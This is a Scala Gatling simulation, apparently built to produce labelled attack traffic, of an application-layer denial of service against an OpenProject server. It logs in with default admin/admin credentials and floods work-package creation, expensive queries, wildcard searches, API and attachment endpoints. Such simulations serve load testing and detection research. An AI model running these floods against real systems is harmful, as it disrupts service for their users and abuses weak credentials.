package openproject

import io.gatling.core.Predef._
import io.gatling.http.Predef._
import scala.concurrent.duration._

// T1498.002 - Application-layer DoS via resource exhaustion
class T1498_ApplicationDoSSimulation extends Simulation {

  // configuration
  val baseUrl = sys.props.getOrElse("baseUrl", "http://localhost:8080")
  val attackDuration = Integer.getInteger("duration", 120).seconds
  val concurrentAttackers = Integer.getInteger("attackers", 5)

  // http protocol
  val httpProtocol = http
    .baseUrl(baseUrl)
    .acceptHeader("application/json,text/html,*/*")
    .userAgentHeader("DoS Simulation Tool")
    .header("X-Experiment-ID", "attack_app_dos_v1")
    .header("X-Event-Label", "malicious")
    .header("X-Scenario-ID", "T1498_APP_DOS")
    .header("X-Attack-Technique", "T1498.002")
    .disableFollowRedirect

  // Compromised credentials
  val attackAccount = Map(
    "username" -> "admin",
    "password" -> "admin"
  )

  // scenario 1: mass work package creation
  val massWorkPackageCreation = scenario("T1498 - Mass Work Package Creation")
    .exec(http("Auth")
      .get("/login")
      .check(css("input[name='authenticity_token']", "value").saveAs("csrf")))
    .exec(http("Login")
      .post("/login")
      .formParam("username", attackAccount("username"))
      .formParam("password", attackAccount("password"))
      .formParam("authenticity_token", "${csrf}")
      .check(status.in(200, 302)))
    .pause(1.second)
    .repeat(100, "counter") {
      exec(http("Create Work Package ${counter}")
        .post("/api/v3/work_packages")
        .header("Content-Type", "application/json")
        .body(StringBody(
          """
          {
            "_links": {
              "type": { "href": "/api/v3/types/1" }
            },
            "subject": "DoS WP ${counter} - ${__RandomString(30)}",
            "description": {
              "raw": "${__RandomString(1000)}"
            }
          }
          """
        ))
        .check(status.in(200, 201, 403, 422)))
      .pause(100.milliseconds, 500.milliseconds)
    }

  // scenario 2: complex query flood
  val complexQueryFlood = scenario("T1498 - Complex Query Flood")
    .exec(http("Auth")
      .get("/login")
      .check(css("input[name='authenticity_token']", "value").saveAs("csrf")))
    .exec(http("Login")
      .post("/login")
      .formParam("username", attackAccount("username"))
      .formParam("password", attackAccount("password"))
      .formParam("authenticity_token", "${csrf}")
      .check(status.in(200, 302)))
    .pause(500.milliseconds)
    .repeat(50, "q") {
      exec(http("Expensive Query ${q}")
        .get("/api/v3/work_packages")
        .queryParam("pageSize", "1000")
        .queryParam(
          "filters",
          """[{"status":{"operator":"*","values":[]}},{"type":{"operator":"*","values":[]}},{"priority":{"operator":"*","values":[]}}]"""
        )
        .queryParam(
          "sortBy",
          """[["updatedAt","desc"],["createdAt","desc"],["id","desc"]]"""
        )
        .check(status.in(200, 500, 503)))
      .pause(50.milliseconds, 200.milliseconds)
    }

  // scenario 3: search abuse
  val searchAbuse = scenario("T1498 - Search Abuse")
    .exec(http("Auth")
      .get("/login")
      .check(css("input[name='authenticity_token']", "value").saveAs("csrf")))
    .exec(http("Login")
      .post("/login")
      .formParam("username", attackAccount("username"))
      .formParam("password", attackAccount("password"))
      .formParam("authenticity_token", "${csrf}")
      .check(status.in(200, 302)))
    .pause(500.milliseconds)
    .repeat(100, "s") {
      exec(http("Wildcard Search ${s}")
        .get("/search")
        .queryParam("q", "%${__RandomString(20)}%")
        .queryParam("scope", "all")
        .queryParam("all_words", "1")
        .check(status.in(200, 500, 503)))
      .pause(100.milliseconds, 300.milliseconds)
    }

  // scenario 4: api endpoint exhaustion
  val apiExhaustion = scenario("T1498 - API Endpoint Exhaustion")
    .repeat(200, "i") {
      exec(http("API Root Flood ${i}")
        .get("/api/v3")
        .check(status.in(200, 429, 503)))
      .pause(10.milliseconds, 50.milliseconds)

      .exec(http("Projects Flood ${i}")
        .get("/api/v3/projects")
        .queryParam("pageSize", "100")
        .check(status.in(200, 429, 503)))
      .pause(10.milliseconds, 50.milliseconds)
    }

  // scenario 5: file metadata abuse
  val fileOperationsAbuse = scenario("T1498 - File Operations Abuse")
    .exec(http("Auth")
      .get("/login")
      .check(css("input[name='authenticity_token']", "value").saveAs("csrf")))
    .exec(http("Login")
      .post("/login")
      .formParam("username", attackAccount("username"))
      .formParam("password", attackAccount("password"))
      .formParam("authenticity_token", "${csrf}")
      .check(status.in(200, 302)))
    .pause(500.milliseconds)
    .repeat(100, "f") {
      exec(http("Attachments List ${f}")
        .get("/api/v3/attachments")
        .queryParam("pageSize", "100")
        .check(status.in(200, 403, 429, 503)))
      .pause(50.milliseconds, 200.milliseconds)
    }

  // execution
  setUp(
    massWorkPackageCreation.inject(atOnceUsers(concurrentAttackers)),
    complexQueryFlood.inject(atOnceUsers(concurrentAttackers)),
    searchAbuse.inject(atOnceUsers(concurrentAttackers)),
    apiExhaustion.inject(atOnceUsers(concurrentAttackers)),
    fileOperationsAbuse.inject(atOnceUsers(concurrentAttackers))
  ).protocols(httpProtocol)
   .maxDuration(attackDuration)
}
